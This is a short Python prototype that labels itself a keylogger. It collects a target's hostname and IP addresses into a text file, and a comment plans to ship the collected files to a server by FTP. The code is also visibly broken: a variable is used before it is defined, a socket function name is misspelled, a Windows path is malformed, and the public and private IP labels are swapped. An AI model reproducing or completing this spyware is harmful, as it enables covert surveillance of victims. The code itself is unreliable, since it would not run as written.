#prototype keylogger prints system info 
#to add: use ftp on client side to send the files to server

import socket
from requests import get

log = 'keylog.txt'
sys = 'sysinfo.txt'
path = "C:\Users\HP\Desktop\ACM"
add = '\\'

def sysinfo():
    with open(file + add + sys, "a") as file:
        name = socket.gethostname()
        #        
        pub_ip = socket.gethosybyname(name)
        priv_ip = get("https://api.ipify.org").text
        file.write("pub ip: " + pub_ip + "\n")
        file.write("targets name: " + name + "\n")
        file.write("priv ip: " + priv_ip + '\n')
